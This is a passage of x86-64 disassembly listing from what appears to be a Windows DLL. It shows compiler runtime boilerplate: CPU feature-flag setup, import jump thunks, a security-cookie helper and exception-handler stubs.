   180001e3c:	41 f6 c3 20          	test   $0x20,%r11b
   180001e40:	74 38                	je     0x180001e7a
   180001e42:	83 c8 20             	or     $0x20,%eax
   180001e45:	c7 05 01 22 00 00 05 	movl   $0x5,0x2201(%rip)        # 0x180004050
   180001e4c:	00 00 00 
   180001e4f:	89 05 ff 21 00 00    	mov    %eax,0x21ff(%rip)        # 0x180004054
   180001e55:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   180001e5a:	44 23 d8             	and    %eax,%r11d
   180001e5d:	44 3b d8             	cmp    %eax,%r11d
   180001e60:	75 18                	jne    0x180001e7a
   180001e62:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180001e67:	24 e0                	and    $0xe0,%al
   180001e69:	3c e0                	cmp    $0xe0,%al
   180001e6b:	75 0d                	jne    0x180001e7a
   180001e6d:	83 0d e0 21 00 00 40 	orl    $0x40,0x21e0(%rip)        # 0x180004054
   180001e74:	89 1d d6 21 00 00    	mov    %ebx,0x21d6(%rip)        # 0x180004050
   180001e7a:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   180001e7f:	33 c0                	xor    %eax,%eax
   180001e81:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   180001e86:	48 83 c4 10          	add    $0x10,%rsp
   180001e8a:	5f                   	pop    %rdi
   180001e8b:	c3                   	ret
   180001e8c:	b8 01 00 00 00       	mov    $0x1,%eax
   180001e91:	c3                   	ret
   180001e92:	cc                   	int3
   180001e93:	cc                   	int3
   180001e94:	33 c0                	xor    %eax,%eax
   180001e96:	39 05 d4 21 00 00    	cmp    %eax,0x21d4(%rip)        # 0x180004070
   180001e9c:	0f 95 c0             	setne  %al
   180001e9f:	c3                   	ret
   180001ea0:	ff 25 f2 11 00 00    	jmp    *0x11f2(%rip)        # 0x180003098
   180001ea6:	ff 25 e4 11 00 00    	jmp    *0x11e4(%rip)        # 0x180003090
   180001eac:	ff 25 f6 11 00 00    	jmp    *0x11f6(%rip)        # 0x1800030a8
   180001eb2:	ff 25 30 12 00 00    	jmp    *0x1230(%rip)        # 0x1800030e8
   180001eb8:	ff 25 22 12 00 00    	jmp    *0x1222(%rip)        # 0x1800030e0
   180001ebe:	ff 25 04 12 00 00    	jmp    *0x1204(%rip)        # 0x1800030c8
   180001ec4:	ff 25 ee 11 00 00    	jmp    *0x11ee(%rip)        # 0x1800030b8
   180001eca:	ff 25 f0 11 00 00    	jmp    *0x11f0(%rip)        # 0x1800030c0
   180001ed0:	ff 25 1a 12 00 00    	jmp    *0x121a(%rip)        # 0x1800030f0
   180001ed6:	ff 25 f4 11 00 00    	jmp    *0x11f4(%rip)        # 0x1800030d0
   180001edc:	ff 25 f6 11 00 00    	jmp    *0x11f6(%rip)        # 0x1800030d8
   180001ee2:	cc                   	int3
   180001ee3:	cc                   	int3
   180001ee4:	b0 01                	mov    $0x1,%al
   180001ee6:	c3                   	ret
   180001ee7:	cc                   	int3
   180001ee8:	33 c0                	xor    %eax,%eax
   180001eea:	c3                   	ret
   180001eeb:	cc                   	int3
   180001eec:	48 83 ec 28          	sub    $0x28,%rsp
   180001ef0:	4d 8b 41 38          	mov    0x38(%r9),%r8
   180001ef4:	48 8b ca             	mov    %rdx,%rcx
   180001ef7:	49 8b d1             	mov    %r9,%rdx
   180001efa:	e8 0d 00 00 00       	call   0x180001f0c
   180001eff:	b8 01 00 00 00       	mov    $0x1,%eax
   180001f04:	48 83 c4 28          	add    $0x28,%rsp
   180001f08:	c3                   	ret
   180001f09:	cc                   	int3
   180001f0a:	cc                   	int3
   180001f0b:	cc                   	int3
   180001f0c:	40 53                	rex push %rbx
   180001f0e:	45 8b 18             	mov    (%r8),%r11d
   180001f11:	48 8b da             	mov    %rdx,%rbx
   180001f14:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   180001f18:	4c 8b c9             	mov    %rcx,%r9
   180001f1b:	41 f6 00 04          	testb  $0x4,(%r8)
   180001f1f:	4c 8b d1             	mov    %rcx,%r10
   180001f22:	74 13                	je     0x180001f37
   180001f24:	41 8b 40 08          	mov    0x8(%r8),%eax
   180001f28:	4d 63 50 04          	movslq 0x4(%r8),%r10
   180001f2c:	f7 d8                	neg    %eax
   180001f2e:	4c 03 d1             	add    %rcx,%r10
   180001f31:	48 63 c8             	movslq %eax,%rcx
   180001f34:	4c 23 d1             	and    %rcx,%r10
   180001f37:	49 63 c3             	movslq %r11d,%rax
   180001f3a:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   180001f3e:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180001f42:	8b 48 08             	mov    0x8(%rax),%ecx
   180001f45:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180001f49:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   180001f4e:	74 0b                	je     0x180001f5b
   180001f50:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   180001f55:	83 e0 f0             	and    $0xfffffff0,%eax
   180001f58:	4c 03 c8             	add    %rax,%r9
   180001f5b:	4c 33 ca             	xor    %rdx,%r9
   180001f5e:	49 8b c9             	mov    %r9,%rcx
   180001f61:	5b                   	pop    %rbx
   180001f62:	e9 a9 f2 ff ff       	jmp    0x180001210
   180001f67:	ff 25 33 11 00 00    	jmp    *0x1133(%rip)        # 0x1800030a0
   180001f6d:	cc                   	int3
   180001f6e:	cc                   	int3
   180001f6f:	cc                   	int3
   180001f70:	cc                   	int3
   180001f71:	cc                   	int3
   180001f72:	cc                   	int3
   180001f73:	cc                   	int3
   180001f74:	cc                   	int3
   180001f75:	cc                   	int3
   180001f76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180001f7d:	00 00 00 
   180001f80:	ff e0                	jmp    *%rax
   180001f82:	cc                   	int3
   180001f83:	cc                   	int3
   180001f84:	cc                   	int3
   180001f85:	cc                   	int3
   180001f86:	cc                   	int3
   180001f87:	cc                   	int3
   180001f88:	cc                   	int3
   180001f89:	cc                   	int3
   180001f8a:	cc                   	int3
   180001f8b:	cc                   	int3
   180001f8c:	cc                   	int3
   180001f8d:	cc                   	int3
   180001f8e:	cc                   	int3
   180001f8f:	cc                   	int3
   180001f90:	cc                   	int3
   180001f91:	cc                   	int3
   180001f92:	cc                   	int3
   180001f93:	cc                   	int3
   180001f94:	cc                   	int3
   180001f95:	cc                   	int3
   180001f96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180001f9d:	00 00 00 
   180001fa0:	ff 25 6a 11 00 00    	jmp    *0x116a(%rip)        # 0x180003110
   180001fa6:	40 55                	rex push %rbp
   180001fa8:	48 83 ec 20          	sub    $0x20,%rsp
   180001fac:	48 8b ea             	mov    %rdx,%rbp
   180001faf:	8a 4d 40             	mov    0x40(%rbp),%cl
   180001fb2:	48 83 c4 20          	add    $0x20,%rsp
   180001fb6:	5d                   	pop    %rbp
   180001fb7:	e9 04 fb ff ff       	jmp    0x180001ac0
   180001fbc:	cc                   	int3
   180001fbd:	40 55                	rex push %rbp
   180001fbf:	48 83 ec 20          	sub    $0x20,%rsp
   180001fc3:	48 8b ea             	mov    %rdx,%rbp
   180001fc6:	8a 4d 20             	mov    0x20(%rbp),%cl
   180001fc9:	e8 f2 fa ff ff       	call   0x180001ac0
   180001fce:	90                   	nop
   180001fcf:	48 83 c4 20          	add    $0x20,%rsp
   180001fd3:	5d                   	pop    %rbp
   180001fd4:	c3                   	ret
   180001fd5:	cc                   	int3
   180001fd6:	40 55                	rex push %rbp
   180001fd8:	48 83 ec 20          	sub    $0x20,%rsp
   180001fdc:	48 8b ea             	mov    %rdx,%rbp
   180001fdf:	48 83 c4 20          	add    $0x20,%rsp
   180001fe3:	5d                   	pop    %rbp
   180001fe4:	e9 63 f9 ff ff       	jmp    0x18000194c
   180001fe9:	cc                   	int3
   180001fea:	40 55                	rex push %rbp
   180001fec:	48 83 ec 30          	sub    $0x30,%rsp
   180001ff0:	48 8b ea             	mov    %rdx,%rbp
   180001ff3:	48 8b 01             	mov    (%rcx),%rax
   180001ff6:	8b 10                	mov    (%rax),%edx
   180001ff8:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180001ffd:	89 54 24 20          	mov    %edx,0x20(%rsp)
   180002001:	4c 8d 0d 28 f2 ff ff 	lea    -0xdd8(%rip),%r9        # 0x180001230
   180002008:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   18000200c:	8b 55 68             	mov    0x68(%rbp),%edx
   18000200f:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   180002013:	e8 a4 f8 ff ff       	call   0x1800018bc
   180002018:	90                   	nop
   180002019:	48 83 c4 30          	add    $0x30,%rsp
   18000201d:	5d                   	pop    %rbp
   18000201e:	c3                   	ret
   18000201f:	cc                   	int3
   180002020:	40 55                	rex push %rbp
   180002022:	48 8b ea             	mov    %rdx,%rbp
   180002025:	48 8b 01             	mov    (%rcx),%rax
   180002028:	33 c9                	xor    %ecx,%ecx
   18000202a:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   180002030:	0f 94 c1             	sete   %cl
   180002033:	8b c1                	mov    %ecx,%eax
   180002035:	5d                   	pop    %rbp
   180002036:	c3                   	ret
   180002037:	cc                   	int3
